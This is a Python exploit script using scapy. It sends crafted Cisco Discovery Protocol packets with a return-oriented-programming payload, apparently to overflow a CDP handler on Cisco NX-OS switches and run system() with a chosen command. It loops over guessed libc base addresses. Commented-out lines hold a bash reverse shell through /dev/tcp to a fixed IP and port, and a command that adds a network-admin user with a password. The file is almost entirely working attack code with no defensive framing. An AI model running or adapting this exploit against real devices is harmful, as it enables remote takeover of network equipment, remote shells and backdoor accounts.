from scapy.contrib import cdp
from scapy.all import Ether, LLC, SNAP, sendp
from time import sleep
import struct
from random import choice

libc_bss_offset = 0x001B4EE0 + 0x200 # use for a1
system_offset = 0x0003c790
execve_offset = 0x000B31B0

pr_offset = 0x00021b07 # pop eax; ret
# pppr_offset_offset = 0x000df5d2 # pop ebp ; pop edi ; pop ebx ; ret
ppr_offset_offset = 0x0001764a  # pop ebp ; pop ebx ; ret

# cmd = '/isan/bin/vsh -c "configure terminal ; username test password qweASD123 role network-admin"'
# cmd = 'bash -i >& /dev/tcp/192.168.204.149/23333 0>&1'
cmd = 'touch /root/hacked'

def gen(libc_base):
    payload = ""
    payload += struct.pack('>I', 0x0) + 'A' * 64
    payload += struct.pack('>I', 0x00001337) + struct.pack('>I', libc_base + pr_offset) # saved ebp + ret addr
    payload += struct.pack('>I', libc_base + libc_bss_offset) # a1
    payload += struct.pack('>I', libc_base + ppr_offset_offset) + struct.pack('>I', 0x00001337) * 2
    payload += (struct.pack('>I', libc_base + pr_offset) + struct.pack('>I', 0x00001337)) * 5
    payload += struct.pack('>I', libc_base + system_offset) + struct.pack('>I', 0x00001337)
    return payload


def exploit(payload):
    # link layer
    l2_packet = Ether(dst="01:00:0c:cc:cc:cc")
    # Logical-Link Control
    l2_packet /= LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP()
    # Cisco Discovery Protocol
    cdp_v2 = cdp.CDPv2_HDR(vers=2, ttl=180)
    deviceid = cdp.CDPMsgDeviceID(val=cmd)
    portid = cdp.CDPMsgPortID(iface=b"ens38")
    address = cdp.CDPMsgAddr(naddr=1, addr=cdp.CDPAddrRecordIPv4(addr="192.168.204.77"))
    cap = cdp.CDPMsgCapabilities(cap=1)
    power_req = cdp.CDPMsgUnknown19(val=payload)
    power_level = cdp.CDPMsgPower(power=16)
    cdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level
    packet = l2_packet / cdp_packet
    sendp(packet)



guess_libc_list = [
    0xf5dbb000
]



def main():
    # assert offset_to_cmd !=0 
    # for libc_base in range(0xf5000000, 0xf5fff000, 0x1000):
    #     try:
    #         print('[*] Exploiting...guess libc on {0}'.format(hex(libc_base)))
    #         payload = gen(libc_base)
    #         exploit(payload)
    #     except Exception as e:
    #         print(e)
    #     sleep(5)
    while(True):
        libc_base = choice(guess_libc_list)
        print('[*] Guess {0}'.format(hex(libc_base)))
        payload = gen(libc_base)
        exploit(payload)
        raw_input('stop, press ENTER to next round exploit.')


def test():
    payload = gen(0xf5d8a000)
    exploit(payload)



if __name__ == '__main__':
    main()
    # test()



